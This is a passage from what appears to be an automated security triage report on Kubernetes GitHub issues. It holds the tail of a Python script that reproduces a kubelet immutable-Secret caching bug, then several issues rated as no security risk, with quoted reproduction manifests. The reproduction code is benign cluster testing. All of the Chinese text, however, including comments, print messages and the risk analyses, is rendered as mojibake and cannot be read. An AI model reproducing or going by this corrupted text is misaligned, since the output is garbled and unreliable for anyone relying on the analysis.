        core_v1.create_namespaced_secret(namespace=namespace, body=secret_v1)
    except ApiException as e:
        if e.status == 409:
            print("Secretå·²å­˜åœ¨ï¼Œå°†å°è¯•åˆ é™¤å¹¶é‡å»ºã€‚")
            core_v1.delete_namespaced_secret(name=secret_name, namespace=namespace)
            time.sleep(5)
            core_v1.create_namespaced_secret(namespace=namespace, body=secret_v1)
        else:
            raise

    # 3. åˆ›å»ºPod1å¹¶æŒ‚è½½Secret
    print(f"3. åˆ›å»ºPod1 '{pod1_name}' å¹¶æŒ‚è½½Secret")
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod1_name},
        "spec": {
            "containers": [{
                "name": "test-container",
                "image": "busybox",
                "command": ["/bin/sh", "-c", "sleep 3600"],
                "volumeMounts": [{
                    "name": "secret-vol",
                    "mountPath": mount_path,
                }],
            }],
            "volumes": [{
                "name": "secret-vol",
                "secret": {
                    "secretName": secret_name,
                },
            }],
        },
    }
    core_v1.create_namespaced_pod(namespace=namespace, body=pod_manifest)

    # 4. ç­‰å¾…Pod1è¿è¡Œå¹¶è·å–å…¶æ‰€åœ¨èŠ‚ç‚¹
    print(f"4. ç­‰å¾… '{pod1_name}' è¿è¡Œ...")
    node_name = None
    w = watch.Watch()
    for event in w.stream(core_v1.list_namespaced_pod, namespace=namespace, timeout_seconds=60):
        pod = event['object']
        if pod.metadata.name == pod1_name and pod.status.phase == "Running":
            node_name = pod.spec.node_name
            print(f"'{pod1_name}' æ­£åœ¨èŠ‚ç‚¹ '{node_name}' ä¸Šè¿è¡Œã€‚")
            w.stop()
            break
        if time.time() - start_time > timeout_seconds:
            print("é”™è¯¯ï¼šç­‰å¾…Pod1è¿è¡Œè¶…æ—¶ã€‚")
            cleanup(core_v1, namespace)
            return

    if not node_name:
        print(f"é”™è¯¯: æœªèƒ½è·å– '{pod1_name}' çš„è¿è¡ŒèŠ‚ç‚¹ã€‚")
        cleanup(core_v1, namespace)
        return

    # 5. åˆ é™¤å¹¶é‡å»ºSecretï¼Œæ·»åŠ æ–°key
    print(f"5. åˆ é™¤Secret '{secret_name}'")
    core_v1.delete_namespaced_secret(name=secret_name, namespace=namespace)
    # ç­‰å¾…åˆ é™¤æ“ä½œåœ¨kubeletç«¯ç”Ÿæ•ˆ
    time.sleep(10)
    
    print("   é‡å»ºSecretï¼Œæ·»åŠ æ–°key (key1: value2, key2: new-value)")
    secret_v2_data = {
        "key1": base64.b64encode(b"value2").decode("utf-8"),
        "key2": base64.b64encode(b"new-value").decode("utf-8"), # æ·»åŠ æ–°key
    }
    secret_v2 = client.V1Secret(
        api_version="v1",
        kind="Secret",
        metadata=client.V1ObjectMeta(name=secret_name),
        data=secret_v2_data,
        immutable=True,
    )
    core_v1.create_namespaced_secret(namespace=namespace, body=secret_v2)

    # 6. åˆ›å»ºPod2ï¼Œå¹¶å¼ºåˆ¶è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹
    print(f"6. åˆ›å»ºPod2 '{pod2_name}' å¹¶è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹ '{node_name}'")
    pod2_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod2_name},
        "spec": {
            "nodeName": node_name, # å¼ºåˆ¶è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹
            "containers": [{
                "name": "test-container-2",
                "image": "busybox",
                # å°è¯•è®¿é—®æ–°keyï¼Œå¦‚æœä¸å­˜åœ¨ä¼šå¯¼è‡´å®¹å™¨å¯åŠ¨å¤±è´¥
                "command": ["/bin/sh", "-c", f"cat {mount_path}/key2 && sleep 3600"],
                "volumeMounts": [{
                    "name": "secret-vol",
                    "mountPath": mount_path,
                }],
            }],
            "volumes": [{
                "name": "secret-vol",
                "secret": {
                    "secretName": secret_name,
                },
            }],
            "restartPolicy": "Never" # æ–¹ä¾¿è§‚å¯Ÿå¤±è´¥çŠ¶æ€
        },
    }
    core_v1.create_namespaced_pod(namespace=namespace, body=pod2_manifest)
    
    # 7. æ£€æŸ¥Pod2çš„äº‹ä»¶ï¼ŒéªŒè¯é—®é¢˜æ˜¯å¦å­˜åœ¨
    print("7. æ£€æŸ¥Pod2çš„çŠ¶æ€å’Œäº‹ä»¶ä»¥éªŒè¯é—®é¢˜...")
    time.sleep(5) # ç­‰å¾…Podå¼€å§‹åˆ›å»º
    
    bug_reproduced = False
    end_time = time.time() + 60 # æ£€æŸ¥60ç§’
    while time.time() < end_time:
        try:
            # æ£€æŸ¥Podäº‹ä»¶
            events = core_v1.list_namespaced_event(namespace, field_selector=f"involvedObject.name={pod2_name}")
            for event in events.items:
                if event.reason == "FailedMount" and "couldn't find key" in event.message and "key2" in event.message:
                    print("\n--- æ¼æ´å¤ç°æˆåŠŸ! ---")
                    print(f"æˆåŠŸæ•è·åˆ°Pod '{pod2_name}' çš„FailedMountäº‹ä»¶:")
                    print(f"åŸå› : {event.reason}, æ¶ˆæ¯: {event.message}")
                    bug_reproduced = True
                    break
            
            # æ£€æŸ¥PodçŠ¶æ€
            pod2_status = core_v1.read_namespaced_pod_status(name=pod2_name, namespace=namespace)
            if pod2_status.status.container_statuses:
                state = pod2_status.status.container_statuses[0].state
                if state.waiting and state.waiting.reason == "CreateContainerConfigError":
                    print("\n--- æ¼æ´å¤ç°æˆåŠŸ! ---")
                    print(f"æˆåŠŸè§‚å¯Ÿåˆ°Pod '{pod2_name}' çŠ¶æ€ä¸º CreateContainerConfigErrorã€‚")
                    print(f"æ¶ˆæ¯: {state.waiting.message}")
                    bug_reproduced = True
                    break

            if bug_reproduced:
                break
            time.sleep(5)

        except ApiException as e:
            print(f"æ£€æŸ¥PodçŠ¶æ€æ—¶å‡ºé”™: {e}")
            time.sleep(5)

    if not bug_reproduced:
        print("\n--- æœªèƒ½å¤ç°æ¼æ´ ---")
        print("Pod2å¯èƒ½æœªæŠ¥å‘Šé¢„æœŸçš„é”™è¯¯ï¼Œæˆ–å·²æˆåŠŸå¯åŠ¨ã€‚è¯·æ‰‹åŠ¨æ£€æŸ¥Podå’ŒèŠ‚ç‚¹çŠ¶æ€ã€‚")

    # æ¸…ç†èµ„æº
    cleanup(core_v1, namespace)


def cleanup(api, namespace):
    """
    æ¸…ç†å‡½æ•°ï¼Œåˆ é™¤åˆ›å»ºçš„èµ„æºã€‚
    """
    print("\n--- å¼€å§‹æ¸…ç†èµ„æº ---")
    try:
        api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
        print(f"å‘½åç©ºé—´ '{namespace}' å·²è¢«æ ‡è®°åˆ é™¤ã€‚")
    except ApiException as e:
        print(f"åˆ é™¤å‘½åç©ºé—´ '{namespace}' å¤±è´¥: {e}")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨ä½¿ç”¨`kubernetes-client`åº“åœ¨çœŸå®çš„Kubernetesé›†ç¾¤ä¸­è‡ªåŠ¨åŒ–åœ°å¤ç°Issueä¸­æè¿°çš„`kubelet`ç¼“å­˜é—®é¢˜ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **ç¯å¢ƒé…ç½®**ï¼šè„šæœ¬é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰æ¥ä¸Kubernetesé›†ç¾¤å»ºç«‹è¿æ¥ã€‚
2.  **åˆ›å»ºå‘½åç©ºé—´**ï¼šä¸ºäº†éš”ç¦»æµ‹è¯•ç¯å¢ƒï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªåä¸º`immutable-secret-poc`çš„ç‹¬ç«‹å‘½åç©ºé—´ã€‚
3.  **åˆ›å»ºåˆå§‹èµ„æº**ï¼š
    *   è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º`my-immutable-secret`çš„**ä¸å¯å˜ï¼ˆimmutableï¼‰** Secretï¼Œå…¶ä¸­åªåŒ…å«ä¸€ä¸ªé”®`key1`ï¼Œå€¼ä¸º`value1`ã€‚
    *   æ¥ç€ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º`pod-first`çš„Podï¼Œå®ƒä¼šæŒ‚è½½ä¸Šè¿°Secretã€‚
4.  **å®šä½èŠ‚ç‚¹**ï¼šè„šæœ¬ä¼šç­‰å¾…`pod-first`æˆåŠŸè¿›å…¥`Running`çŠ¶æ€ï¼Œå¹¶è®°å½•ä¸‹å®ƒæ‰€åœ¨çš„èŠ‚ç‚¹åç§°ï¼ˆ`node_name`ï¼‰ã€‚è¿™æ˜¯å¤ç°é—®é¢˜çš„å…³é”®ï¼Œå› ä¸ºåç»­çš„Podéœ€è¦è¢«è°ƒåº¦åˆ°åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šã€‚
5.  **æ›´æ–°Secret**ï¼š
    *   è„šæœ¬ä¼š**åˆ é™¤**`my-immutable-secret`ã€‚
    *   ç„¶åï¼Œå®ƒä¼šä»¥**ç›¸åŒçš„åç§°**é‡æ–°åˆ›å»ºä¸€ä¸ª**ä¸å¯å˜**çš„Secretï¼Œä½†è¿™æ¬¡å†…å®¹è¢«æ›´æ–°äº†ï¼š`key1`çš„å€¼å˜ä¸º`value2`ï¼Œå¹¶ä¸”å¢åŠ äº†ä¸€ä¸ªæ–°çš„é”®`key2`ã€‚
6.  **è§¦å‘é—®é¢˜**ï¼š
    *   è„šæœ¬åˆ›å»ºç¬¬äºŒä¸ªPodï¼Œåä¸º`pod-second`ã€‚
    *   é€šè¿‡è®¾ç½®`spec.nodeName`ï¼Œæ­¤Podè¢«**å¼ºåˆ¶è°ƒåº¦**åˆ°ä¸`pod-first`ç›¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚
    *   `pod-second`çš„å¯åŠ¨å‘½ä»¤å°è¯•è¯»å–æ–°æ·»åŠ çš„`key2`ã€‚ç”±äº`kubelet`çš„ç¼“å­˜æ˜¯é™ˆæ—§çš„ï¼Œå®ƒä¸çŸ¥é“`key2`çš„å­˜åœ¨ã€‚
7.  **éªŒè¯å’Œç»“æœ**ï¼š
    *   è„šæœ¬ä¼šæŒç»­ç›‘æ§`pod-second`çš„äº‹ä»¶ï¼ˆEventsï¼‰å’ŒçŠ¶æ€ã€‚
    *   å¦‚æœé—®é¢˜è¢«æˆåŠŸå¤ç°ï¼Œ`kubelet`å°†æ— æ³•ä¸º`pod-second`æä¾›`key2`ï¼Œå¯¼è‡´æŒ‚è½½å¤±è´¥ã€‚è¿™ä¼šäº§ç”Ÿä¸€ä¸ªç±»å‹ä¸º`FailedMount`çš„äº‹ä»¶ï¼Œå…¶æ¶ˆæ¯ä¼šåŒ…å«`couldn't find key 'key2' in Secret`ã€‚
    *   è„šæœ¬æ•è·åˆ°è¿™ä¸ªç‰¹å®šçš„äº‹ä»¶æˆ–Podè¿›å…¥`CreateContainerConfigError`çŠ¶æ€ï¼Œå°±è¯æ˜æ¼æ´å¤ç°æˆåŠŸï¼Œå¹¶æ‰“å°æˆåŠŸä¿¡æ¯ã€‚
8.  **æ¸…ç†**ï¼šæ— è®ºå¤ç°æ˜¯å¦æˆåŠŸï¼Œè„šæœ¬æœ€åéƒ½ä¼šè°ƒç”¨`cleanup`å‡½æ•°ï¼Œåˆ é™¤æ•´ä¸ª`immutable-secret-poc`å‘½åç©ºé—´ï¼Œä»¥æ¸…ç†æ‰€æœ‰æµ‹è¯•èµ„æºï¼ˆPods, Secretç­‰ï¼‰ã€‚

---


# âœ… ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (20 ä¸ª)

## Issue #132042 Unexpected Pod creation delay after recreating Jobs with same names

- Issue é“¾æ¥ï¼š[#132042](https://github.com/kubernetes/kubernetes/issues/132042)

### Issue å†…å®¹

#### What happened?

Pod creations are delayed for up to 10 minutes after creating a Job, which is previously deleted as well as its pods in foreground deletion.

I noticed this case while using [jobset](https://github.com/kubernetes-sigs/jobset), which when notices a pod failure, it deletes all Jobs and Pods (controlled by jobset spec) then creates new Jobs with same names. After creation of new jobs, I found some Jobs had no Pods. I observed the following logs:

```
"enqueueing job" logger="job-controller" key="default/base-100-workers-0" delay="0"
"enqueueing job" logger="job-controller" key="default/base-100-workers-0" delay="9m35.78848664s"
```

#### What did you expect to happen?

Since jobs are newly created, there should no delays in creating their pods.

#### How can we reproduce it (as minimally and precisely as possible)?

1. setup a k8s cluster with a few nodes
2. install jobset
3. apply below jobset

```
apiVersion: jobset.x-k8s.io/v1alpha2
kind: JobSet
metadata:
  annotations:
    alpha.jobset.sigs.k8s.io/exclusive-topology: cloud.google.com/gke-nodepool
  name: base-100
  namespace: default
spec:
  failurePolicy:
    maxRestarts: 2000
    restartStrategy: Recreate
  network:
    enableDNSHostnames: true
    publishNotReadyAddresses: true
  replicatedJobs:
  - name: workers
    replicas: 4
    template:
      metadata: {}
      spec:
        backoffLimit: 0
        completionMode: Indexed
        completions: 30
        parallelism: 30
        template:
          metadata: {}
          spec:
            containers:
            - name: pi
              image: busybox
              command: ["sh",  "-c", "sleep 10 && exit 10"]
              resources: {}
            restartPolicy: Never
            terminationGracePeriodSeconds: 0
```

You should see the delays in pod creation or similar logs from job controller.

#### Anything else we need to know?

Those setup creates a JobSet and since the Pods fails after running for a few seconds, the JobSet controller deletes all 4 Jobs and Pods, then create 4 new Jobs with the same names. For example, base-100-workers-[0|1|2|3] and keys used in the [queue](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L592) and [podBackoffStore](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L912) are identical if job names are the same.

The bug is likely caused by the race condition:

* t0: job0 (v0) is created
* t1: pods of job0 are created and running
* t2: pods fail and job controller records a backoff record with key default/job0 due the to non-zero number of failed Pods
* t3: job0 and pods are deleted by Jobset controller, deletion events are not yet processed by job controller
* t4: job0 (v1) is created
* t5: job0 creation event is processed by job controller and syncJob() [gets the backoffRecord](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L912) with key default/job0, which is old record from previous job
* t6: job controller gets non-zero remainingTime in [here](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/job/job_controller.go#L1709) so it enqueues the job0 task again to delay the pod creation

It appears to me that we need to use a better key in backoffRecordStore to fix this bug or strictly guarantee the sequence of processing Job/Pod events, which will delete the old records from backoffRecordStore.



#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»æè¿°æ¥çœ‹ï¼Œè¯¥Issueä¸»è¦æ˜¯å› ä¸ºJob Controllerä½¿ç”¨ç›¸åŒkeyè®°å½•æ—§Jobçš„backoffä¿¡æ¯ï¼Œå¯¼è‡´æ–°åˆ›å»ºçš„åŒåJobä¾æ—§è¢«åº”ç”¨äº†æ—§çš„å›é€€å»¶æ—¶ï¼ˆbackoffï¼‰ï¼Œä»è€Œå‡ºç°å®¹å™¨å¯åŠ¨å»¶æ—¶çš„é—®é¢˜ã€‚æ­¤é—®é¢˜å±äºKubernetes Job Controlleråœ¨å¤„ç†åŒåJobæ—¶å‡ºç°çš„å¹¶å‘æˆ–ç«æ€æ¡ä»¶ï¼ˆrace conditionï¼‰å¯¼è‡´çš„åŠŸèƒ½æ€§Bugï¼Œå¹¶ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œæˆ–å…¶ä»–å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å®ƒä¸ä¼šé€ æˆå¯¹ç³»ç»Ÿæ•°æ®çš„ç ´åï¼Œä¹Ÿä¸æ¶‰åŠæ³„éœ²å‡­æ®åŠå®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©è¡Œä¸ºã€‚å› æ­¤ï¼Œå¯ä»¥åˆ¤æ–­è¯¥é—®é¢˜å±äºåŠŸèƒ½ç¼ºé™·è€Œéå®‰å…¨æ¼æ´ã€‚

**è§£é‡Šè¯´æ˜ï¼š**

æ­¤é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼Œä¸æ¶‰åŠåˆ°å¯è¢«å¤–éƒ¨åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¸ä¼šå¯¼è‡´æ•°æ®æŠ«éœ²ã€æ³¨å…¥ã€è¶Šæƒè®¿é—®æˆ–å®¹å™¨é€ƒé€¸ã€‚å› æ­¤ï¼Œæ ¹æ®ç»™å®šçš„é£é™©è¯„çº§æ ‡å‡†ï¼Œè¯¥é—®é¢˜çš„é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œæ— éœ€ç¼–å†™å®‰å…¨æ–¹é¢çš„å¤ç°è„šæœ¬ã€‚è¯¥é—®é¢˜åç»­å¯åœ¨Kubernetesçš„Job Controlleré€»è¾‘ä¿®å¤æˆ–ä¼˜åŒ–åå¾—åˆ°è§£å†³ã€‚

---


## Issue #132037 kube-scheduler does not consider hostPort ports used by initContainers when scheduling

- Issue é“¾æ¥ï¼š[#132037](https://github.com/kubernetes/kubernetes/issues/132037)

### Issue å†…å®¹

#### What happened?

When running two pods that both use hostNetwork and have sidecar initContainers (restartPolicy: Always) using the same port, kube-scheduler allows the pods to be scheduled on the same node.



#### What did you expect to happen?

kube-scheduler does not schedule these two pods on the same node, following the behavior for pods using hostNetwork ports via a main container.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a kind cluster: `kind create cluster`.  The cluster only has one node.
2. Apply p1:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     name: p1
   spec:              
     hostNetwork: true
     dnsPolicy: ClusterFirstWithHostNet
     initContainers:
     - name: init
       restartPolicy: Always    
       image: python:3.12                                                                                                                                                                                                            
       command:
       - /bin/bash
       - -c
       - python -m http.server 8081
       ports:
       - containerPort: 8081
     containers:
     - name: main
       image: python:3.12
       command:
       - /bin/bash
       - -c
       - sleep 10000
   ```
3. Apply p2:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     name: p2
   spec:
     hostNetwork: true
     dnsPolicy: ClusterFirstWithHostNet
     initContainers:
     - name: init
       restartPolicy: Always    
       image: python:3.12                                                                                                                                                                                                            
       command:
       - /bin/bash
       - -c
       - python -m http.server 8081
       ports:
       - containerPort: 8081
     containers:
     - name: main
       image: python:3.12
       command:
       - /bin/bash
       - -c
       - sleep 10000
   ```
4. p2 is scheduled (and crashing because p1 is already using the port).


#### Anything else we need to know?

kube-scheduler already accounts for hostNetwork ports used by main containers.  For example:

1. Create a kind cluster: `kind create cluster`.  The cluster only has one node.
2. Apply p1:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     name: p1
   spec:              
     hostNetwork: true
     dnsPolicy: ClusterFirstWithHostNet
     containers:
     - name: main
       image: python:3.12
       command:
       - /bin/bash
       - -c
       - python -m http.server 8081
       ports:
       - containerPort: 8081
   ```
3. Apply p2:
   ```
   apiVersion: v1
   kind: Pod
   metadata:
     name: p2
   spec:
     hostNetwork: true
     dnsPolicy: ClusterFirstWithHostNet
     containers:
     - name: main
       image: python:3.12
       command:
       - /bin/bash
       - -c
       - python -m http.server 8081
       ports:
       - containerPort: 8081
   ```
4. p2 is not scheduled: `Warning  FailedScheduling  3m7s  default-scheduler  0/1 nodes are available: 1 node(s) didn't have free ports for the requested pod ports. preemption: 0/1 nodes are available: 1 No preemption victims found for incoming pod.`

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.9
Kustomize Version: v5.4.2
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>
local kind cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»Issueçš„æè¿°æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªè°ƒåº¦å™¨åœ¨å¤„ç†initContainerçš„hostPortæ—¶æ‰€äº§ç”Ÿçš„ç«¯å£å†²çªé—®é¢˜ã€‚è¯¥é—®é¢˜å¯¼è‡´ä¸¤ä¸ªç«¯å£ç›¸åŒä¸”ä½¿ç”¨hostNetworkçš„Podè¢«é”™è¯¯åœ°è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹ä¸Šï¼Œä»è€Œä½¿ååˆ›å»ºçš„Podæ— æ³•æ­£å¸¸å¯åŠ¨æˆ–å¤„äºCrashLoopçŠ¶æ€ã€‚  
è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯è°ƒåº¦å™¨å¯¹äºinitContainerä½¿ç”¨ä¸»æœºç«¯å£æœªè¿›è¡Œå……åˆ†çº¦æŸçš„è®¾è®¡æˆ–é€»è¾‘ç¼ºé™·ï¼Œå¯¼è‡´Podè°ƒåº¦åå‡ºç°å†²çªã€‚å®ƒå¹¶æœªå¼•å…¥æ¶æ„æ”»å‡»é¢æˆ–å¯¼è‡´ä½æƒé™ç”¨æˆ·å¯è¿›è¡Œç‰¹æƒæ“ä½œï¼Œä¹Ÿä¸æ¶‰åŠæœºå¯†ä¿¡æ¯æ³„éœ²ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰å®‰å…¨å¨èƒã€‚  
å› æ­¤ï¼Œæ­¤é—®é¢˜åº”è§†ä¸ºè°ƒåº¦å™¨åŠŸèƒ½/è®¾è®¡ç¼ºé™·ï¼Œä¸»è¦æ˜¯å½±å“ç³»ç»Ÿå¯ç”¨æ€§æˆ–å®¹å™¨éƒ¨ç½²çš„ç¨³å®šæ€§ï¼Œè€Œéä¸æ”»å‡»åœºæ™¯ç›´æ¥ç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚

**è§£é‡Šè¯´æ˜ï¼š**

æ­¤é—®é¢˜å¹¶ä¸å±äºå¯è¢«æ¶æ„åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œæ•…æ— éœ€ç»™å‡ºé’ˆå¯¹å®‰å…¨æ”»å‡»åœºæ™¯çš„å¤ç°è„šæœ¬ã€‚å®ƒæ›´æ¥è¿‘ä¸€ä¸ªæ™®é€šçš„äº§å“ç¼ºé™·æˆ–åŠŸèƒ½æ€§Bugï¼Œä¸ä¼šç›´æ¥å¯¼è‡´æƒé™æå‡ã€å®¹å™¨é€ƒé€¸æˆ–æ•æ„Ÿä¿¡æ¯æ³„éœ²ç­‰é«˜é£é™©å®‰å…¨äº‹ä»¶ã€‚è‹¥æ‚¨éœ€è¦éªŒè¯è¯¥é—®é¢˜æœ¬èº«ï¼Œå¯ä½¿ç”¨Issueæè¿°ä¸­çš„æ­¥éª¤æ‰‹åŠ¨åœ¨æœ¬åœ°æµ‹è¯•ã€‚

---


## Issue #132027 func IsDNS1123SubdomainWithUnderscore return error message is incorrect

- Issue é“¾æ¥ï¼š[#132027](https://github.com/kubernetes/kubernetes/issues/132027)

### Issue å†…å®¹

#### What happened?

func `IsDNS1123SubdomainWithUnderscore()` return error message is incorrect

#### What did you expect to happen?

When the regex rule of the `IsDNS1123SubdomainWithUnderscore()` function does not match, it returns `dns1123SubdomainFmt` instead of `dns1123SubdomainFmtWithUnderscore`

#### How can we reproduce it (as minimally and precisely as possible)?

/

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.33.1
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue ä»…æ¶‰åŠå‡½æ•°è¿”å›çš„é”™è¯¯æç¤ºä¸æ­£ç¡®ï¼Œä¸å…·ä½“çš„å®‰å…¨æ¼æ´æˆ–é£é™©æ— å…³ï¼Œæ²¡æœ‰æ¶‰åŠåˆ°ä»»ä½•æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡ç­‰å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€å¤ç°è„šæœ¬
```


---


## Issue #132020 kubelet podresources API incorrectly reports memory assignments of terminated pods

- Issue é“¾æ¥ï¼š[#132020](https://github.com/kubernetes/kubernetes/issues/132020)

### Issue å†…å®¹

#### What happened?

The kubelet podresources endpoint returns allocated exclusive resources to active pods. The endpoint incorrectly returns resources allocated to terminated pods.



#### What did you expect to happen?

Kubelet podresources should not report the resources allocated to terminated pods 

#### How can we reproduce it (as minimally and precisely as possible)?

```
 kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.33.0
```

Run pods using Job 

 Run the job that reproduces the issue 
 
```
apiVersion: batch/v1
kind: Job
metadata:
  labels:
    app: idle-gu-job-sched-stall
  generateName: generic-pause-
spec:
  backoffLimit: 6
  completionMode: NonIndexed
  completions: 2
  manualSelector: false
  parallelism: 2
  podReplacementPolicy: TerminatingOrFailed
  suspend: false
  template:
    metadata:
      labels:
        app: idle-gu-job-sched-stall
    spec:
      containers:
      - args:
        - 1s
        command:
        - /bin/sleep
        image: quay.io/openshift-kni/pause:test-ci
        imagePullPolicy: IfNotPresent
        name: generic-job-idle
        resources:
          limits:
            cpu: 100m
            memory: 256Mi
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
      dnsPolicy: ClusterFirst
      restartPolicy: Never
      schedulerName: default-scheduler
      terminationGracePeriodSeconds: 30
      topologySpreadConstraints:
      - labelSelector:
          matchLabels:
            app: idle-gu-job-sched-stall
        matchLabelKeys:
        - pod-template-hash
        maxSkew: 1
        topologyKey: kubernetes.io/hostname
        whenUnsatisfiable: DoNotSchedule

```
Wait for the pods to complete:

```
$kubectl get pods -o wide
NAME                        READY   STATUS    RESTARTS   AGE    IP           NODE                                NOMINATED NODE   READINESS GATES
debug-tools                 1/1     Running   0          6m7s   10.244.1.7   k8slatest-worker-0.karmalabs.corp   <none>           <none>
debug-tools2                1/1     Running   0          17s    10.244.2.2   k8slatest-worker-1.karmalabs.corp   <none>           <none>
generic-pause-49jxp-ccbfq   1/1     Running   0          8s     10.244.2.3   k8slatest-worker-1.karmalabs.corp   <none>           <none>
generic-pause-49jxp-lbgv9   1/1     Running   0          8s     10.244.1.8   k8slatest-worker-0.karmalabs.corp   
<none>           <none>
```


```
$ kubectl get pods -o wide
NAME                        READY   STATUS      RESTARTS   AGE     IP           NODE                                NOMINATED NODE   READINESS GATES
debug-tools                 1/1     Running     0          6m14s   10.244.1.7   k8slatest-worker-0.karmalabs.corp   <none>           <none>
debug-tools2                1/1     Running     0          24s     10.244.2.2   k8slatest-worker-1.karmalabs.corp   <none>           <none>
generic-pause-49jxp-ccbfq   0/1     Completed   0          15s     10.244.2.3   k8slatest-worker-1.karmalabs.corp   <none>           <none>
generic-pause-49jxp-lbgv9   0/1     Completed   0          15s     10.244.1.8   k8slatest-worker-0.karmalabs.corp   <none>           <none>
```
use podresource API to fetch the pods. 

```
kubectl exec -it pods/debug-tools -- bash
[root@debug-tools /]# knit podres
{"pod_resources":[{"name":"ingress-nginx-admission-create-kszf8","namespace":"ingress-nginx","containers":[{"name":"create"}]},{"name":"ingress-nginx-admission-patch-9nkb9","namespace":"ingress-nginx","containers":[{"name":"patch"}]},{"name":"debug-tools","namespace":"default","containers":[{"name":"debug-tools-container"}]},{"name":"kube-proxy-xkpjv","namespace":"kube-system","containers":[{"name":"kube-proxy"}]},{"name":"ingress-nginx-controller-5976dd7964-vtjct","namespace":"ingress-nginx","containers":[{"name":"controller"}]},{"name":"generic-pause-49jxp-lbgv9","namespace":"default","containers":[{"name":"generic-job-idle"}]},{"name":"kube-multus-ds-fgmlz","namespace":"kube-system","containers":[{"name":"kube-multus"}]},{"name":"kube-flannel-ds-nhhnn","namespace":"kube-flannel","containers":[{"name":"kube-flannel"}]}]}
```
the above tool knit can be accessed by running below pod:

```
apiVersion: v1
kind: Pod
metadata:
  name: debug-tools2
  labels:
      name: "debug"
spec:
  containers:
  - name: debug-tools-container2
    image: "quay.io/openshift-kni/debug-tools:latest"
    command:
    - sleep 
    - inf 
    resources:
      limits:
        memory: "500Mi"
        cpu: "2"
    volumeMounts:
    - mountPath: /var/lib/kubelet/pod-resources/kubelet.sock
      name: host-podresources
    securityContext:
      capabilities:
        add: ["SYS_ADMIN"]
